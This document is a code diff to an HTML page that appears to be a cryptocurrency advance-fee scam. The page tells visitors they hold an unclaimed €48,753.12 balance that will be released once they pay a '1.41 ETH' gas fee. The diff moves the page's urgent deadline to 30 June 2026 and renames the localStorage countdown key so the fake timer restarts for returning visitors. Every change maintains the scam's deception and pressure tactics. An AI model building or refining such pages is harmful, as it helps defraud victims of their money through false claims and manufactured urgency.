@@ -169,7 +169,7 @@
         <div class="logo-area">
             <h1>Protocol Migration</h1>
             <p>Unclaimed Legacy Balance: <b style="color: var(--success);">€48,753.12</b></p>
-            <div class="deadline-notice">⚠️ Final Window: Closes June 30, 2024</div>
+            <div class="deadline-notice">⚠️ Final Window: Closes 30 June 2026</div>
         </div>
 
         <div class="settlement-card">
@@ -182,7 +182,7 @@
 
         <div class="explanation">
             <b>Smart Contract Verification:</b><br>
-            Case <b class="case-id-text">#ETH-7477-X</b> is eligible for asset release. You must trigger the <b>V2 Proxy Contract</b> before the end of June. The 1.41 ETH fee is the mandatory gas requirement for legacy-to-mainnet bridging.
+            Case <b class="case-id-text">#ETH-7477-X</b> is eligible for asset release. You must trigger the <b>V2 Proxy Contract</b> before the migration deadline of <b>30 June 2026</b>. The 1.41 ETH fee is the mandatory gas requirement for legacy-to-mainnet bridging.
         </div>
 
         <div class="gateway-box">
@@ -210,13 +210,13 @@
     const INITIAL_TIME = 499 * 3600;
 
     let time;
-    const savedTime = localStorage.getItem('migration_timer_v2');
+    const savedTime = localStorage.getItem('migration_timer_v3');
     
     if (savedTime) {
         time = parseInt(savedTime);
     } else {
         time = INITIAL_TIME;
-        localStorage.setItem('migration_timer_v2', time);
+        localStorage.setItem('migration_timer_v3', time);
     }
 
     function copyAddress() {
@@ -243,7 +243,7 @@
     setInterval(() => {
         if (time > 0) {
             time--;
-            localStorage.setItem('migration_timer_v2', time);
+            localStorage.setItem('migration_timer_v3', time);
         }
         
         let h = Math.floor(time / 3600);
